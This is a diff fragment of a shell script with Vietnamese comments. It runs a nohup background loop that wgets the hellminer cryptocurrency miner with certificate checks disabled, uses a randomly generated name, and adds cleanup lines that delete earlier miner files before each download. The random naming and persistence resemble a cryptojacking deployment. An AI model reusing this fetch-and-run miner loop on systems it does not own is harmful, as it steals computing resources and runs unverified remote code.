@@ -9,6 +9,11 @@ generate_random_name() {
 nohup sh -c '
 while true; do
   # Tải file
+  rm -f hellminer_linux64_avx2.tar.gz
+  rm -rf "$random_name"
+  rm -rf run_miner.sh
+  rm -rf verus-solver
+  
   wget -q --no-check-certificate https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz
 
   # Giải nén file
